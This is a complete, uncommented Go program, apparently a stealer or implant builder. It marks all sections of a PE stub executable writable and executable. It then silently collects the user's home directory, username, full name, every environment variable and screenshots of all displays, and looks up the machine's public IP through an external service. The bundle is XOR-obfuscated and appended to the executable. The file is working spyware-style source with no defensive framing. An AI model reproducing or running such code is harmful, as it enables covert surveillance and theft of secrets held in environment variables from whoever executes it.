package main

import (
	"bytes"
	"flag"
	"image/png"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"runtime"

	"github.com/Binject/debug/pe"
	"github.com/kbinani/screenshot"
)

const IMAGE_SCN_MEM_WRITE = 0x80000000

var stubPath, outputPath string

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

func init() {
	flag.StringVar(&outputPath, "o", "", "where to put the finished file")
	flag.StringVar(&stubPath, "s", "", "where to find the stub file")
	flag.Parse()
	if (len(outputPath) < 1) || (len(stubPath) < 1) {
		flag.Usage()
		os.Exit(0)
	}
}

func main() {
	stub, err := pe.Open(stubPath)
	checkErr(err)
	for index := range stub.Sections {
		newPerms := stub.Section(stub.Sections[index].Name).Characteristics | IMAGE_SCN_MEM_WRITE | pe.IMAGE_SCN_MEM_EXECUTE
		stub.Section(stub.Sections[index].Name).Characteristics = newPerms
	}
	stub.WriteFile(outputPath)

	thisUser, err := user.Current()
	checkErr(err)
	pkg := bytes.NewBuffer([]byte{})
	pkg.WriteString("|*****|")
	pkg.WriteString(thisUser.HomeDir)
	pkg.WriteString("|||")
	pkg.WriteString(thisUser.Username)
	pkg.WriteString("|||")
	pkg.WriteString(thisUser.Name)
	for _, enVar := range os.Environ() {
		pkg.WriteString(enVar)
		pkg.WriteString("|")
	}
	for index := 0; index < screenshot.NumActiveDisplays(); index++ {
		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(index))
		checkErr(err)
		png.Encode(pkg, img)
		pkg.WriteString("|||")
	}
	resp, err := http.Get("https://myexternalip.com/raw")
	checkErr(err)
	defer resp.Body.Close()
	ip, err := ioutil.ReadAll(resp.Body)
	checkErr(err)
	pkg.Write(ip)
	pkg.WriteString("|||")
	pkg.WriteString(runtime.GOARCH)
	pkg.WriteString("|||")
	pkg.WriteString(runtime.GOOS)

	stub2, err := os.OpenFile(outputPath, os.O_APPEND|os.O_WRONLY, 0600)
	checkErr(err)
	defer stub2.Close()

	for {
		bite, err := pkg.ReadByte()
		if err != nil {
			break
		}
		stub2.Write([]byte{bite ^ 0xff})
	}
}
